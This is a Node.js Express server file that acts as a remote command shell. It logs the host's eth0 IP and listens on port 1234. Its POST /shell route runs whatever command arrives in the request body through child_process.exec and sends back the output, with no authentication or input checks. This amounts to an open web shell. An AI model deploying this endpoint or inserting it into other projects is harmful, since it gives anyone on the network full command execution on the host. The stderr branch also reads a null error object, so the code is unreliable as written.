const express = require('express');
const ip = require('./ip.js');

const app = express();
const bodyParser = require('body-parser');

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

console.log('ip : ', ip.eth0);

jsoncmd = {
    connect : "",
    nb : -1,
    result : [
    ]
}


app.get('/log', function(req, res) {
    console.log('logged');

    jsoncmd.connect = "accepted";
    res.send(JSON.stringify(jsoncmd));
});

app.post('/shell', function(req, res) {

    console.log(req.body.cmd);

    const { exec } = require("child_process");

    exec(req.body.cmd, (error, stdout, stderr) => {
        if (error) {
            console.log(`error: ${error.message}`);

            jsoncmd.nb = jsoncmd.nb + 1;
            jsoncmd.result[jsoncmd.nb] = {line : `error: ${error.message}`};
            console.log('cmd -> ', JSON.stringify(jsoncmd));
            res.send(JSON.stringify(jsoncmd));

            return;
        }
        if (stderr) {
            console.log(`stderr: ${stderr}`);

            jsoncmd.nb = jsoncmd.nb + 1;
            jsoncmd.result[jsoncmd.nb] = {line : `error: ${error.message}`};
            console.log('cmd -> ', JSON.stringify(jsoncmd));
            res.send(JSON.stringify(jsoncmd));

            return;
        }
        console.log(`stdout: ${stdout}`);

        jsoncmd.nb = jsoncmd.nb + 1;
        jsoncmd.result[jsoncmd.nb] = {line : `${stdout}`};
        console.log('cmd -> ', JSON.stringify(jsoncmd));
        res.send(JSON.stringify(jsoncmd));
    });
});

app.listen(1234, () => {
    console.log('listening on port 1234');
});
